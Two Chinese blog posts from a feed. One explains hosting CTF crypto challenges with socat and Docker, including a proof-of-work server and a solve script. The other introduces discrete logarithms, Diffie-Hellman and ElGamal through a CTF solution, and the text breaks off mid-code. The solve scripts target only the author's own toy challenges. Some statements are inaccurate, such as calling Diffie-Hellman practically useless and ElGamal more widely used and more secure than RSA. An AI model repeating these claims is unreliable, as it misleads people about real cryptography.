<h1 id="CTF密码题是怎么炼成的"><a href="#CTF密码题是怎么炼成的" class="headerlink" title="CTF密码题是怎么炼成的"></a>CTF密码题是怎么炼成的</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>web和pwn的出题会用到docker的相关操作，出pwn题，有个大佬写了个<a href="https://github.com/giantbranch/pwn_deploy_chroot">脚本</a>一键搭</p>
<p>而Crypto出题就不用那么麻烦（指环境搭建），可以只写下python脚本就好，主要还是对服务器进行配置吧，想起了某段时间，我一直在配置pwn环境的虚拟机，<em>先虚拟机，再vim，再换源，再zsh，on-my-zsh，p10k，再vim主题</em>，pwn用到的环境以及一些工具主要参考的是（Crypto交互会用到其中的pwntools</p>
<p><a href="https://blog.csdn.net/Y_peak/article/details/112850307">https://blog.csdn.net/Y_peak/article/details/112850307</a></p>
<p>这里到时候整一篇Crypto工具配置</p>
<p><a href="https://4xwi11.github.io/posts/1cc01193/">https://4xwi11.github.io/posts/1cc01193/</a></p>
<p>接下来正式开始</p>
<p>主要参考</p>
<p><a href="https://blog.soreatu.com/posts/how-to-setup-for-interactive-crypto-problems/">https://blog.soreatu.com/posts/how-to-setup-for-interactive-crypto-problems/</a></p>
<h2 id="socat直接挂载"><a href="#socat直接挂载" class="headerlink" title="socat直接挂载"></a>socat直接挂载</h2><p>比较简便，适合校内比赛自己玩</p>
<p>主要是题目文件server.py，以及run.py</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913214156007.png" alt="image-20210913214156007"></p>
<p>然后是启动程序，可以遵循以下模式，可以一直在这个端口运行（端口在运行的时候自己选择，阿里云的服务器是要在工作台开起来先）；还有开启防火墙端口的操作，可以直接看上面这位大师傅的，我一般复现只开一个端口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [port]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = <span class="string">&#x27;socat -d -d tcp-l:&#x27;</span> + port + <span class="string">&#x27;,reuseaddr,fork EXEC:&quot;python -u server.py&quot; &#x27;</span></span><br><span class="line">os.system(command)</span><br></pre></td></tr></table></figure>

<p>将命令换成（前面加个nohup</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nohup socat -d -d tcp-l:[port],reuseaddr,fork EXEC:<span class="string">&quot;python -u server.py&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>就可以在服务器上一直跑了（除非服务器关了</p>
<h2 id="Docker打包的方式"><a href="#Docker打包的方式" class="headerlink" title="Docker打包的方式"></a>Docker打包的方式</h2><p>之前的删了，太不实用，还是出不来题（校赛出题被赵总吐槽没有docker），因为照抄别人的没有灵魂，根本不会，所以这篇回炉重造</p>
<hr>
<p>之前的一些问题</p>
<ul>
<li>镜像搭建太慢（换阿里源之后还行，但更多的是安装方式（比如gmp2包是用wheel还是安装依赖</li>
<li>容器创建完程序就退出了</li>
<li>题目有问题……</li>
</ul>
<p>这里以一道极其简单的题目为例（之前直接拿比赛的文件，结果各种环境和问题，其实不便我们学习</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201224939539.png" alt="image-20211201224939539"></p>
<p>server.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">            [random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;[+] sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            self.send(<span class="string">b&#x27;[!] Wrong!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        self.send(<span class="string">b&#x27;here is your flag&#x27;</span>)</span><br><span class="line">        self.send(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>DockerFile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Description=<span class="string">&quot;baby_try&quot;</span> VERSION=<span class="string">&#x27;1.0&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> server.py .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> secret.py .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x server.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">12345</span>	<span class="comment"># 仅仅是申明，没有实际用，容器都是随机映射的，这里方便编写者查看</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;server.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line">        <span class="comment"># self.sh = remote(&#x27;121.36.197.254&#x27;, 9999)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># [+] sha256(XXXX+JaakUDSfxkW0xjzV) == 4dbfdc61cb88f5bd08d87493ac62e5ab174780f5f019051f91df8b3c36564ed0</span></span><br><span class="line">        <span class="comment"># [+] Plz tell me X<span class="doctag">XXX:</span></span></span><br><span class="line">        proof = self.sh.recvuntil(<span class="string">b&#x27;[+] Plz tell me XXXX:&#x27;</span>)</span><br><span class="line">        tail = proof[<span class="number">16</span>:<span class="number">32</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">37</span>:<span class="number">101</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.sh.recvline()</span><br><span class="line">        flag = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        self.sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br></pre></td></tr></table></figure>

<h3 id="step1-创建镜像"><a href="#step1-创建镜像" class="headerlink" title="step1 创建镜像"></a>step1 创建镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker build . -t baby_try</span></span><br></pre></td></tr></table></figure>

<h3 id="step2-启动容器"><a href="#step2-启动容器" class="headerlink" title="step2 启动容器"></a>step2 启动容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --name trytry -d -idt -p 12345:10001 baby_try</span></span><br></pre></td></tr></table></figure>

<p>将端口映射到本地12345端口</p>
<h3 id="step3-尝试exp打本地"><a href="#step3-尝试exp打本地" class="headerlink" title="step3 尝试exp打本地"></a>step3 尝试exp打本地</h3><p>没什么问题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201233335956.png" alt="image-20211201233335956"></p>
<h3 id="step4-挂载服务器"><a href="#step4-挂载服务器" class="headerlink" title="step4 挂载服务器"></a>step4 挂载服务器</h3><p>本地没问题后，就要部署到服务器上，操作和socat类似就不做了，以后碰到问题再说</p>
<h2 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h2><p>创建镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker build . -t [images_name]</span></span><br></pre></td></tr></table></figure>

<p>查看创建的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker images</span></span><br></pre></td></tr></table></figure>

<p>创建容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --name [container_name] -d [-idt] -p [host_port]:[container_port] [images_name]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>-d</code>表示不进入容器内部</li>
<li><code>-p</code>表示将容器内部的port_inner端口映射到port_outer端口</li>
<li><code>-idt</code>表示创建守护进程（没有这个容器创建完程序就退出了，不太清楚</li>
</ul>
<p>查看正在运行的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker ps -a</span></span><br></pre></td></tr></table></figure>

<p>停止容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker stop [container_id]</span></span><br></pre></td></tr></table></figure>

<p>删除容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker rm [container_id]</span></span><br></pre></td></tr></table></figure>

<p>删除镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker rmi [image_id]</span></span><br></pre></td></tr></table></figure>

<p>进入容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker attach [container_id]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it [container_id] bash</span></span><br></pre></td></tr></table></figure>

<h2 id="常用Dockerfile语法"><a href="#常用Dockerfile语法" class="headerlink" title="常用Dockerfile语法"></a>常用Dockerfile语法</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 看菜鸟教程</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto技能树</category>
      </categories>
  </entry>
  <entry>
    <title>DH and ElGamal</title>
    <url>/posts/898249b7/</url>
    <content><![CDATA[<p>这次做到离散对数的密码，虽然原理跟着老师走了一遍，但是没有什么实战经历没有什么感觉，这里用一道题入手吧</p>
<span id="more"></span>

<h1 id="DH协议及ElGamal加密方案的实现"><a href="#DH协议及ElGamal加密方案的实现" class="headerlink" title="DH协议及ElGamal加密方案的实现"></a>DH协议及ElGamal加密方案的实现</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>先介绍下前导知识</p>
<blockquote>
<p>离散对数，DL（Discrete Logarithm）</p>
</blockquote>
<p>从la佬博客la来的话</p>
<p>在任何群$G$中可为所有整数$k$定义一个幂数为$b^k$，而离散对数$log^b_a$是指使得 $b^k=a$的整数$k$。离散对数在一些特殊情况下可以快速计算。然而，通常没有具非常效率的方法来计算它们。公钥密码学中几个重要算法的基础，是假设寻找离散对数的问题解，在仔细选择过的群中，并不存在有效率的求解算法。</p>
<blockquote>
<p>密钥交换协议，DH（Diffie Hellman）</p>
</blockquote>
<p>就是以下面两位帅气大佬的名字命名的</p>
<p>本质上也是一种密码方案，只是因存在重大安全问题无法抵御中间人攻击而无任何实用性，但是其思想是ElGamal加密的基石</p>
<img alt="DH协议及ElGamal加密方案的实现-125e55ac.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-125e55ac.png" width="" height="" >

<blockquote>
<p>ElGamal加密算法</p>
</blockquote>
<p>是这位来自埃及的大佬发明的</p>
<p>是比RSA使用更广，也就是更安全高效的密码方案</p>
<img alt="DH协议及ElGamal加密方案的实现-a4564ef7.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-a4564ef7.png" width="" height="">


<h2 id="2020网鼎杯-青龙组-you-raise-me-up"><a href="#2020网鼎杯-青龙组-you-raise-me-up" class="headerlink" title="2020网鼎杯-青龙组-you raise me up"></a>2020网鼎杯-青龙组-you raise me up</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure>

<p>已知<br>$$<br>n=2^{512}\<br>c=m^{flag}\ mod\ n<br>$$<br>求$flag$</p>
<p>显然按照一般的思维来说，这就是离散对数问题，找到这个指数flag是困难的，所以针第二个条件我们没有办法，所以我们就可以从n入手</p>
<p>想必n是2的512次方，比较特殊，然后可以直接求phi(n)，<br>$$<br>\phi(n)=2^{511}<br>$$</p>
<h3 id="关于求欧拉函数"><a href="#关于求欧拉函数" class="headerlink" title="关于求欧拉函数"></a>关于求欧拉函数</h3><p>关于这一步求欧拉函数，我还遇到一个小插曲，由于之前的结论<br>$$<br>(p, q)=1,n=pq\Rightarrow \phi(n)<br>=(p-1)\times(q-1)<br>$$<br>从这里来的惯性思维，我一直理解不了为什么不是$\phi(2^{512})=(2-1)^{512}=1$，虽然显然这个是错的</p>
<p>然后在查资料的过程中，发现了不少宝藏，这里有个师傅总结的求欧拉函数的方法，整理得太好了<br><a href="https://blog.csdn.net/paxhujing/article/details/51353672">https://blog.csdn.net/paxhujing/article/details/51353672</a></p>
<h4 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h4><p>若$n=1$，则<br>$$<br>\phi(n)=1<br>$$</p>
<h4 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h4><p>若$n$是质数，则<br>$$<br>\phi(n)=n-1<br>$$</p>
<h4 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a>第三种情况</h4><p>若$p$是质数，$k\ge1$，则<br>$$<br>\phi(p^k)=p^k-p^{k-1}=p^k(1-\frac{1}{p})<br>$$<br>这个有必要证明下，因为上面用到的就是这条性质</p>
<p>还是枚举法，在$[1,p^k]$，显然只有$p,2p,3p,p^{k-1}p$与之不互素，那互素的数的个数不得是$p^k-p^{k-1}$</p>
<h4 id="第四种情况"><a href="#第四种情况" class="headerlink" title="第四种情况"></a>第四种情况</h4><p>也就是RSA里面常见的，这个我之前也在作业里证明过，注意p和q不一定要是质数</p>
<p>若$n=p\times q$且$(p,q)=1$，则<br>$$<br>\phi(n)=\phi(p)\times \phi(q)=(p-1)\times (q-1)<br>$$</p>
<h4 id="第五种情况"><a href="#第五种情况" class="headerlink" title="第五种情况"></a>第五种情况</h4><p>也是求欧拉函数的通式</p>
<p>由FTA可知，任何一个大于1的整数n，可以拆分为一系列素数幂的积$n=p^{k_1}_1p^{k_2}_2…p^{k_r}_r$，由三、四情况的结论可知<br>$$<br>\phi(n)=p^{k_1}_1p^{k_2}_2…p^{k_r}_r(1-\frac{1}{p_1})(1-\frac{1}{p_2})…(1-\frac{1}{p_r})<br>$$</p>
<p>即<br>$$<br>\phi(n)=n(1-\frac{1}{p_1})(1-\frac{1}{p_2})…(1-\frac{1}{p_r})<br>$$</p>
<hr>
<p>那么有了第三种情况的结论，我之前的疑问也得到了解答</p>
<p>但是回到题目，虽然我们知道了phi(n)，但是已知的RSA常见攻击，并没有针对phi(n)泄漏的，毕竟e和d都是未知</p>
<p>所以这道题的思路还是要转到我们今天要讲的DLP上，AKA离散对数分解问题</p>
<h2 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a>DLP</h2><p>这里必须引入一些解DLP问题的方法，正如RSA中解大数分解问题一样，某些特殊的情况会让原本安全的加密变得有漏洞</p>
<blockquote>
<p>还是一样，先使用，后搞懂</p>
</blockquote>
<p>sage yyds</p>
<ul>
<li>通用的求离散对数的方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log(a,base,<span class="built_in">ord</span>,operation)</span><br></pre></td></tr></table></figure>

<p>其中包含pohlig-hellman算法</p>
<ul>
<li>Pollard-Rho算法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log_rho(a,base,<span class="built_in">ord</span>,operation)</span><br></pre></td></tr></table></figure>

<ul>
<li>Pollard-kangaroo算法（lambda算法）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">discrete_log_lambda(a,base,bounds,operation)</span><br></pre></td></tr></table></figure>

<ul>
<li>大步小步算法（BSGS）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bsgs(base,a,bounds,operation)</span><br></pre></td></tr></table></figure>

<p>至于它们的使用和适用条件，先看la佬的博客吧，这里就不展开了，主要也不会DX</p>
<hr>
<p>回到题目，网上的解法是，因为模数n比较特殊，phi(n)可以得到完全分解，这就符合pohlig-hellman的条件，理论上可行</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>收集一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(discrete_log(n, c, m)))</span><br></pre></td></tr></table></figure>

<p>主要有两个线程的库可以用，一个是sage自带的，一个是python中sympy库里的，不过sympy里的比较简单</p>
<img alt="DH协议及ElGamal加密方案的实现-a4040bae.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-a4040bae.png" width="" height="" >

<p>就是求$flag=log^a_b\ mod\ n$</p>
<p>sage里的比较讲究，需要用Mod函数将m和c框定在模n的群里之类的意思吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">m = Mod(m, n)</span><br><span class="line">c = Mod(c, n)</span><br><span class="line"></span><br><span class="line">discrete_log(c, m)</span><br></pre></td></tr></table></figure>

<hr>
<p>前面对离散对数问题有了一个初步的概念，下面我们就进入正题，看看DH协议和ElGamal加密方案的实现</p>
<h2 id="DH协议"><a href="#DH协议" class="headerlink" title="DH协议"></a>DH协议</h2><p>更准确的说法应该是密钥交换协议，其实前面说它也是一种密码方案，不是很准确，因为它并不能加密指定的明文，而是生成双方都知晓，但攻击者却得不到的秘密私钥</p>
<p>它的流程如下</p>
<ol>
<li><p>指定一个安全质数p，要求p最好是2048位的，然后在$\mathbb{Z}^*_p$中找到一个生成元g（emmmmm有效找生成元的算法不会咋整），这些Eve也能知道</p>
</li>
<li><p>Alice选一个私钥x，$x\in \mathbb{Z} _{p-1}$（主要是x是在[1, p-1]这个范围里面的，但至于为什么有点忘了），得到$T_A=g^x\ mod\ p$，并将$T_A$传给Bob</p>
</li>
<li><p>同理，Bob将$T_B=g^y\ mod\ p$发给Alice，其中$T_A,T_B$，Eve也都知晓</p>
</li>
<li><p>此时，Alice可以得到$K_A=(T_B)^{x}=(g^y)^x=g^{xy}$</p>
</li>
<li><p>Bob也可以得到$K_B=(T_A)^{y}=(g^x)^y=g^{xy}$</p>
</li>
</ol>
<p>显然$K_A=K_B$，Alice和Bob从此有了他们才知道的相同的信息，对称密码的福音？</p>
<p>Eve虽然知道$T_A$和$T_B$，但由于离散对数问题的存在，他无法逆向得到x和y，也就得不到$g^{xy}$</p>
<h3 id="DH协议的实现"><a href="#DH协议的实现" class="headerlink" title="DH协议的实现"></a>DH协议的实现</h3><p>老师给的这篇链接里有一些要用到的算法，不过是C的，Python就是屑，sage yyds</p>
<p><a href="https://www.techiedelight.com/elgamal-encryption-algorithm-c/">https://www.techiedelight.com/elgamal-encryption-algorithm-c/</a></p>
<p>改脚本是第一生产力，借鉴了里面求生成元的算法，改成Python的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            y = (y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>原根就是最小生成元</p>
<p>但是可以看出这个算也是遍历到p的，妥妥的brute-force，32位的p都跑不出来，感觉和我的差不多</p>
<p>所以最后p取得16位，复现了上面DH协议的流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> my_gcd, my_ord, l_pow</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    _y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            _y = (_y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> _y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span 